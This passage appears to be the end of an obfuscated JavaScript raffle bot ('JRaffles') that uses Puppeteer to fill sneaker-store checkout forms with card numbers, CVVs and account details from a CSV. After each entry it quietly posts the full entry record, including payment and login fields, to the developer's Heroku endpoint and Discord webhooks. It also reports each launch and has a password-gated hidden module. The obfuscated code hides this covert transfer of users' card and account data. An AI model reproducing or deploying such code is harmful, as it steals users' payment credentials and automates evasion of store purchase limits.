                            var _0x74dfd4 = await _0x42b40c['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x2611fc = await _0x74dfd4['contentFrame']();
                            await _0x2611fc['click']('#number'), await _0x1e21d2(0x3e8), await _0x2611fc['type']('#number', '' + _0x10f3b5[_0x5a3809]['CardNumber'], { 'delay': 0x78 }), _0x74dfd4 = await _0x42b40c['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x2611fc = await _0x74dfd4['contentFrame'](), await _0x1e21d2(0x1c2), await _0x2611fc['click']('#name'), await _0x1e21d2(0x1f4), await _0x2611fc['type']('#name', '' + _0x10f3b5[_0x5a3809]['NameOnCard'], { 'delay': 0x78 }), _0x74dfd4 = await _0x42b40c['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x2611fc = await _0x74dfd4['contentFrame'](), await _0x1e21d2(0x1c2), await _0x2611fc['click']('#expiry'), await _0x1e21d2(0x1f4), await _0x2611fc['type']('#expiry', '' + _0x10f3b5[_0x5a3809]['ExpiryDate'], { 'delay': 0x78 }), _0x74dfd4 = await _0x42b40c['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x2611fc = await _0x74dfd4['contentFrame'](), await _0x1e21d2(0x1c2), await _0x2611fc['click']('#verification_value'), await _0x1e21d2(0x1f4), await _0x2611fc['type']('#verification_value', '' + _0x10f3b5[_0x5a3809]['CVV'], { 'delay': 0x78 }), await _0x42b40c['$eval']('#accepts-flag-raffle', _0x187611 => _0x187611['click']()), await _0x1e21d2(0x7d0), console['log'](_0x1a8584() + '\x20[' + _0x535e18['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x42b40c['$eval']('#continue_button', _0x500fe0 => _0x500fe0['click']()), await _0x1e21d2(0x1b58), await _0x42b40c['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x42b40c['$eval']('.edit_checkout.animate-floating-labels', _0x2a25e => _0x2a25e['submit']()), await _0x1e21d2(0x7d0);
                            try {
                                await _0x42b40c['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x5b28b5 = 'no', _0x406375(_0x10f3b5[_0x5a3809], _0x535e18), console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x535e18['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x2a911f) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x2a911f['message']);
                            }
                            var _0x32ee6e = await _0x3d56af(_0x10f3b5[_0x5a3809], _0x535e18, 'dev', ![]), _0x52d9f6 = await _0x3d56af(_0x10f3b5[_0x5a3809], _0x535e18, 'pub', ![]);
                            let _0x5f0c5b = _0x10f3b5[_0x5a3809];
                            try {
                                prxdata = {
                                    'username': _0xf4f7bc['replace']('#', ''),
                                    'module': _0x535e18['name'],
                                    'entrydata': JSON['stringify'](_0x5f0c5b),
                                    'proxy': '' + _0x510284[_0x5a3809]
                                };
                                var _0x2849be = JSON['stringify'](prxdata);
                                let _0x1787b7 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x2849be, _0x1787b7);
                            } catch (_0x29f9c1) {
                            }
                            const _0x3e9b65 = {
                                'succesDEVMSG': { 'embeds': [_0x32ee6e] },
                                'succesPUBMSG': { 'embeds': [_0x52d9f6] }
                            };
                            try {
                                _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x3e9b65['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x3e9b65['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x28ff05, _0x3e9b65['succesPUBMSG']);
                            } catch (_0x1fdf99) {
                                console['log'](_0x31f5da['yellow'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1fdf99));
                            }
                        } catch (_0x26ec7f) {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20' + _0x26ec7f)), _0x539319 = '' + _0x26ec7f;
                            var _0x55edbe = await _0x3d56af(kickz[_0x5a3809], _0x535e18, 'dev', !![], _0x539319);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x55edbe] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], EMBEDS['errorDEV']), await _0xa0452b(_0x5522d1, EMBEDS['errorDEV']), _0x5b28b5 = 'yes';
                        } finally {
                            _0x33c8fc && _0x33c8fc['close']();
                            if (_0x5b28b5 == 'yes' && _0x3ab4ef != 0x5 && _0x539319 != 'Size\x20Not\x20Found') {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x535e18['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3ab4ef + '\x20/\x205)')), _0x5a3809 = _0x5a3809 - 0x1, _0x3ab4ef = _0x3ab4ef + 0x1;
                                continue;
                            }
                            _0x5b28b5 == 'yes' && _0x3ab4ef >= 0x5 && (_0x456859(_0x10f3b5[_0x5a3809], _0x535e18), _0x5b28b5 = 'no', _0x3ab4ef = 0x0), console['log']('Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x3846ba) {
                    var _0x225ed1 = await _0x534d08(), _0x5c622a = _0x534d99['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x4a910b = _0x4d3f8b['parse'](_0x5c622a, { 'header': !![] })['data'];
                    for (var _0xe9ac7b = 0x0; _0xe9ac7b < _0x4a910b['length']; _0xe9ac7b++) {
                        var _0x174f80 = _0x4a910b[_0xe9ac7b]['Store'], _0x47cdfe = _0x4a910b[_0xe9ac7b]['Mode'];
                        for (var _0x2a2aab of _0x5f2e49) {
                            const _0x569cb7 = _0x2a2aab['name']['includes'](_0x174f80);
                            if (!_0x569cb7)
                                continue;
                            for (mode of _0x2a2aab['modules']) {
                                if (mode['name'] == _0x47cdfe) {
                                    console['log']('Running\x20' + _0x31f5da['cyan'](mode['name'])), await mode['function'](mode, [_0x4a910b[_0xe9ac7b]], _0x225ed1);
                                    var _0x3976df = _0x5c622a['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x534d99['writeFileSync']('../failed-tasks.csv', _0x3976df);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x930872 = await _0x402a5d['get']('Answer');
                    if (_0x930872['Answer']['toLowerCase']() == 'y') {
                        _0x534d99['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x1e21d2(0x3e8);
                        return;
                    }
                    if (_0x930872['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x1e21d2(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x1e21d2(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x846901(_0x348d) {
    var _0x5b3d3e = await _0x534d08(), _0x2b3d19 = _0x534d99['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x3e6c81 = _0x4d3f8b['parse'](_0x2b3d19, { 'header': !![] })['data'];
    for (var _0x11d798 = 0x0; _0x11d798 < _0x3e6c81['length']; _0x11d798++) {
        var _0x3edad9 = _0x3e6c81[_0x11d798]['Store'], _0x1ca4d7 = _0x3e6c81[_0x11d798]['Mode'];
        for (var _0x2f5ab4 of _0x5f2e49) {
            const _0x31cc01 = _0x2f5ab4['name']['includes'](_0x3edad9);
            if (_0x31cc01)
                for (mode of _0x5f2e49[_0x2f5ab4]['modules']) {
                    const _0x1c42ac = mode['name']['includes'](_0x1ca4d7);
                    _0x1c42ac && (_0x348d = mode['name'], await mode['function'](_0x348d, _0x3e6c81[_0x11d798], _0x5b3d3e));
                }
        }
    }
}
async function _0xc8554() {
    await _0x51cdc1(), console['clear']();
    _0x4558f2['threads'] > 0x5 && (_0x4558f2['threads'] = 0x5);
    if (_0x2bc61f != 'devkey' && _0x2bc61f != 'devhook') {
        let _0x3b1f96 = await _0x6b42a['autoUpdate']();
        if (_0x3b1f96 === 'yes')
            return _0x19aebc('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x1d3afc == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x1e21d2(0x2710);
        ;
    }
    await _0x5625e8(_0x1d3afc);
    if (_0x4be85a === ![])
        return console['log']('Closing\x20Browser'), await _0x1e21d2(0xbb8);
    else
        try {
            var _0x2d6df4 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0xf4f7bc
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x2bc61f
                    }
                ]
            }];
            const _0x2cdf4f = { 'embeds': _0x2d6df4 };
            var _0x4a4fa4 = await _0x3d56af(null, null, 'open', ![]);
            const _0x32ba0b = { 'openDEVMSG': { 'embeds': [_0x4a4fa4] } };
            await _0xa0452b(_0x1ec515, _0x32ba0b['openDEVMSG']);
            async function _0x68008c() {
                _0x4a5c1f('JRaffles\x20' + _0x2bc61f), console['clear'](), console['log']('Hello\x20' + _0x31f5da['cyan']('' + _0xf4f7bc) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x2bc61f), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x4a47e3 = 0x0; _0x4a47e3 < _0x5f2e49['length'] - 0x4; _0x4a47e3++) {
                    if (_0x4a47e3 >= 0xa) {
                        console['log']('\x20(' + _0x4a47e3 + ')\x20[' + _0x5f2e49[_0x4a47e3]['name'] + ']');
                        continue;
                    }
                    if (_0x5f2e49[_0x4a47e3]['name'] === 'Reload\x20Settings' || _0x5f2e49[_0x4a47e3]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x4a47e3 + ')\x20\x20[' + _0x5f2e49[_0x4a47e3]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x5f2e49['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x5f2e49['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x5f2e49['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x5f2e49['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x305934();
                if (taskModule > _0x5f2e49['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x1e21d2(0x3e8), _0x68008c();
                if (_0x5f2e49[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                    var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x1b83a6 = await _0x534d08();
                            await _0x26a2d0['function'](_0x26a2d0, _0x1b83a6);
                        }
                        if (taskFunction == 0x2) {
                            var _0x1b83a6 = await _0x534d08(), _0x25147b = await _0x53a139(_0x26a2d0);
                            _0x4558f2['shuffleTasks'] && await _0x362376(_0x25147b), await _0x26a2d0['function'](_0x26a2d0, _0x25147b, _0x1b83a6);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x1b83a6 = await _0x534d08(), _0x25147b = await _0x53a139(_0x26a2d0);
                                _0x4558f2['shuffleTasks'] && await _0x362376(_0x25147b), await _0x26a2d0['function'](_0x26a2d0, _0x25147b, _0x1b83a6);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x1b83a6 = await _0x534d08();
                                    await _0x26a2d0['function'](_0x26a2d0, _0x1b83a6);
                                }
                            }
                        }
                    } catch (_0x2d9fa3) {
                        console['log'](_0x2d9fa3), await _0x1e21d2(0x7d0);
                    }
                    return _0x68008c();
                }
                if (_0x5f2e49[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                        var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x1b83a6 = await _0x534d08(), _0x294a74 = await _0x53a139(_0x26a2d0);
                            _0x4558f2['shuffleTasks'] && await _0x362376(_0x294a74), await _0x26a2d0['function'](_0x26a2d0, _0x294a74, _0x1b83a6);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x1b83a6 = await _0x534d08(), _0x294a74 = await _0x53a139(_0x26a2d0);
                                _0x4558f2['shuffleTasks'] && await _0x362376(_0x294a74), await _0x26a2d0['function'](_0x26a2d0, _0x294a74, _0x1b83a6);
                            }
                        }
                    } catch (_0x48ffc0) {
                        console['log'](_0x48ffc0), await _0x1e21d2(0xfa0);
                    }
                    return _0x68008c();
                }
                if (_0x5f2e49[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                        var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x1b83a6 = await _0x534d08(), _0x294a74 = await _0x53a139(_0x26a2d0);
                            _0x4558f2['shuffleTasks'] && await _0x362376(_0x294a74), await _0x26a2d0['function'](_0x26a2d0, _0x294a74, _0x1b83a6);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x1b83a6 = await _0x534d08(), _0x294a74 = await _0x53a139(_0x26a2d0);
                                _0x4558f2['shuffleTasks'] && await _0x362376(_0x294a74), await _0x26a2d0['function'](_0x26a2d0, _0x294a74, _0x1b83a6);
                            }
                        }
                    } catch (_0x4948dc) {
                        console['log'](_0x4948dc), await _0x1e21d2(0xfa0);
                    }
                    return _0x68008c();
                }
                if (_0x5f2e49[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                    var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x1b83a6 = await _0x534d08();
                        return await _0x26a2d0['function'](_0x26a2d0, _0x1b83a6), _0x68008c();
                    }
                    var _0x1b83a6 = await _0x534d08(), _0x43708b = await _0x53a139(_0x26a2d0);
                    return _0x4558f2['shuffleTasks'] && await _0x362376(_0x43708b), await _0x26a2d0['function'](_0x26a2d0, _0x43708b, _0x1b83a6), _0x68008c();
                }
                if (_0x5f2e49[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                    var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x1b83a6 = await _0x534d08(), _0x43708b = await _0x53a139(_0x26a2d0);
                    return _0x4558f2['shuffleTasks'] && await _0x362376(_0x43708b), await _0x26a2d0['function'](_0x26a2d0, _0x43708b, _0x1b83a6), _0x68008c();
                }
                if (_0x5f2e49[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                    var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x1b83a6 = await _0x534d08(), _0x43708b = await _0x53a139(_0x26a2d0);
                    return _0x4558f2['shuffleTasks'] && await _0x362376(_0x43708b), await _0x26a2d0['function'](_0x26a2d0, _0x43708b, _0x1b83a6), _0x68008c();
                }
                if (_0x5f2e49[taskModule]['name']['includes']('BACKDOOR')) {
                    taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                    var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction], _0x1b83a6 = await _0x534d08(), _0x37c788 = await _0x53a139(_0x26a2d0);
                    return _0x4558f2['shuffleTasks'] && await _0x362376(_0x37c788), await _0x26a2d0['function'](_0x26a2d0, _0x37c788, _0x1b83a6), await _0x1e21d2(0x1388), _0x68008c();
                }
                if (_0x5f2e49[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                    var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x1b83a6 = await _0x534d08(), _0x43708b = await _0x53a139(_0x26a2d0);
                    return _0x4558f2['shuffleTasks'] && await _0x362376(_0x43708b), await _0x26a2d0['function'](_0x26a2d0, _0x43708b, _0x1b83a6), _0x68008c();
                } else {
                    if (_0x5f2e49[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                        var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x1b83a6 = await _0x534d08(), _0x308823 = await _0x53a139(_0x26a2d0);
                            return _0x4558f2['shuffleTasks'] && await _0x362376(_0x308823), await _0x26a2d0['function'](_0x26a2d0, _0x308823, _0x1b83a6), _0x68008c();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x1b83a6 = await _0x534d08();
                                return await _0x26a2d0['function'](_0x26a2d0, null, _0x1b83a6), _0x68008c();
                            }
                        }
                        ;
                    } else {
                        if (_0x5f2e49[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                            var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction], _0x1b83a6 = await _0x534d08(), _0x37c788 = await _0x53a139(_0x26a2d0);
                            return _0x4558f2['shuffleTasks'] && await _0x362376(_0x37c788), await _0x26a2d0['function'](_0x26a2d0, _0x37c788, _0x1b83a6), await _0x1e21d2(0x1388), _0x68008c();
                        } else {
                            if (_0x5f2e49[taskModule]['name'] == 'Google\x20Forms') {
                                taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                                var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction], _0x1b83a6 = await _0x534d08(), _0x37c788 = await _0x53a139(_0x26a2d0);
                                return _0x4558f2['shuffleTasks'] && await _0x362376(_0x37c788), await _0x26a2d0['function'](_0x26a2d0, _0x37c788, _0x1b83a6), await _0x1e21d2(0x1388), _0x68008c();
                            } else {
                                if (_0x5f2e49[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                                    var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x1b83a6 = await _0x534d08(), _0x308823 = await _0x53a139(_0x26a2d0);
                                        return _0x4558f2['shuffleTasks'] && await _0x362376(_0x308823), await _0x26a2d0['function'](_0x26a2d0, _0x308823, _0x1b83a6), _0x68008c();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x1b83a6 = await _0x534d08();
                                            return await _0x26a2d0['function'](_0x26a2d0, null, _0x1b83a6), _0x68008c();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x5f2e49[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                                        var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x26a2d0);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x5f2e49[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                                            var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x1b83a6 = await _0x534d08(), _0xd11de0 = await _0x53a139(_0x26a2d0);
                                                return _0x4558f2['shuffleTasks'] && await _0x362376(_0xd11de0), await _0x26a2d0['function'](_0x26a2d0, _0xd11de0, _0x1b83a6), _0x68008c();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x1b83a6 = await _0x534d08(), _0xd11de0 = await _0x53a139(_0x26a2d0);
                                                    return _0x4558f2['shuffleTasks'] && await _0x362376(_0xd11de0), await _0x26a2d0['function'](_0x26a2d0, _0xd11de0, _0x1b83a6), _0x68008c();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x5f2e49[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                                                var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x1b83a6 = await _0x534d08(), _0x8ca35e = await _0x53a139(_0x26a2d0);
                                                    return _0x4558f2['shuffleTasks'] && await _0x362376(_0x8ca35e), await _0x26a2d0['function'](_0x26a2d0, _0x8ca35e, _0x1b83a6), _0x68008c();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x1b83a6 = await _0x534d08(), _0x8ca35e = await _0x53a139(_0x26a2d0);
                                                        return _0x4558f2['shuffleTasks'] && await _0x362376(_0x8ca35e), await _0x26a2d0['function'](_0x26a2d0, _0x8ca35e, _0x1b83a6), _0x68008c();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x5f2e49[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                                                    var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x1b83a6 = await _0x534d08(), _0x5274a5 = await _0x53a139(_0x26a2d0);
                                                        return _0x4558f2['shuffleTasks'] && await _0x362376(_0x5274a5), await _0x26a2d0['function'](_0x26a2d0, _0x5274a5, _0x1b83a6), _0x68008c();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x1b83a6 = await _0x534d08(), _0x5274a5 = await _0x53a139(_0x26a2d0);
                                                            return _0x4558f2['shuffleTasks'] && await _0x362376(_0x5274a5), await _0x26a2d0['function'](_0x26a2d0, _0x5274a5, _0x1b83a6), _0x68008c();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x5f2e49[taskModule]['name'] == 'KICKZ') {
                                                        taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                                                        var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x1b83a6 = await _0x534d08(), _0x5274a5 = await _0x53a139(_0x26a2d0);
                                                            return _0x4558f2['shuffleTasks'] && await _0x362376(_0x5274a5), await _0x26a2d0['function'](_0x26a2d0, _0x5274a5, _0x1b83a6), _0x68008c();
                                                        } else {
                                                            if (taskFunction == 0x1) {
                                                                var _0x1b83a6 = await _0x534d08(), _0x5274a5 = await _0x53a139(_0x26a2d0);
                                                                return _0x4558f2['shuffleTasks'] && await _0x362376(_0x5274a5), await _0x26a2d0['function'](_0x26a2d0, _0x5274a5, _0x1b83a6), _0x68008c();
                                                            }
                                                        }
                                                        ;
                                                    } else {
                                                        if (_0x5f2e49[taskModule]['name'] == 'ADIDAS\x20CONFIRMED') {
                                                            taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                                                            var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                                                            console['clear']();
                                                            if (taskFunction == 0x0 || taskFunction == 0x1 || taskFunction == 0x2 || taskFunction == 0x3 || taskFunction == 0x4) {
                                                                var _0x1b83a6 = await _0x534d08(), _0x5652ed = await _0x53a139(_0x26a2d0);
                                                                return _0x4558f2['shuffleTasks'] && await _0x362376(_0x5652ed), await _0x26a2d0['function'](_0x5652ed, _0x1b83a6), _0x68008c();
                                                            }
                                                        } else {
                                                            if (_0x5f2e49[taskModule]['name'] == 'Seven\x20Store')
                                                                return console['log']('returning\x20to\x20menu'), await _0x1e21d2(0x3e8), _0x68008c();
                                                            else {
                                                                if (_0x5f2e49[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                    var _0x271db6 = _0x5f2e49[taskModule]['name'], _0x1b83a6 = await _0x534d08();
                                                                    return await _0x20e2b9(_0x271db6, _0x1b83a6), _0x68008c();
                                                                } else {
                                                                    if (_0x5f2e49[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                        taskFunction = await _0x713db(_0x5f2e49[taskModule]['modules']);
                                                                        var _0x26a2d0 = _0x5f2e49[taskModule]['modules'][taskFunction];
                                                                        return await _0x26a2d0['function'](_0x26a2d0), _0x68008c();
                                                                    } else {
                                                                        if (_0x5f2e49[taskModule]['name'] == 'Change\x20Settings') {
                                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                            var _0x936c7d = 0x0;
                                                                            for (const _0x24af04 in _0x4558f2) {
                                                                                console['log']('(' + _0x936c7d + ')\x20' + _0x24af04 + '\x20:\x20' + _0x4558f2[_0x24af04]), _0x936c7d++;
                                                                            }
                                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x936c7d + ')\x20Return\x20to\x20Main\x20Menu');
                                                                            var _0x5cef33 = await _0x44ae7();
                                                                            if (_0x5cef33 == _0x936c7d)
                                                                                return _0x68008c();
                                                                            console['clear'];
                                                                            var _0x45d765 = 0x0;
                                                                            for (var _0x284204 in _0x4558f2) {
                                                                                if (_0x5cef33 == _0x45d765) {
                                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x284204 + '\x20:'), _0x4558f2[_0x284204] = await _0x1c78dc(), _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2));
                                                                                    break;
                                                                                } else
                                                                                    _0x45d765++;
                                                                            }
                                                                            return console['log']('Settings\x20Saved!'), await _0x1e21d2(0xbb8), _0x68008c();
                                                                        } else {
                                                                            if (_0x5f2e49[taskModule]['name'] == 'Reload\x20Settings')
                                                                                return console['log']('Reloading\x20settings'), await _0x51cdc1(), _0x68008c();
                                                                            else {
                                                                                if (taskModule == 0x45) {
                                                                                    _0x5f2e49[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                    var _0x19922c = await _0x4b42dc();
                                                                                    _0x19922c == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x1638e1(), await afewFunction(_0x4ca121[_0x40b7ff], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x1e21d2(0xbb8));
                                                                                } else {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x68008c();
            } catch (_0x5eeb57) {
                return console['log'](_0x5eeb57), await _0x1e21d2(0x2710), _0x68008c();
            }
        } catch (_0x340b35) {
            return console['log'](_0x340b35), await _0x1e21d2(0x3a98);
        }
}
;
_0x4a5c1f('JRaffles\x20' + _0x2bc61f);
try {
    _0x51cdc1(), _0xc8554();
} catch (_0x1f17ac) {
    console['log'](_0x1f17ac);
}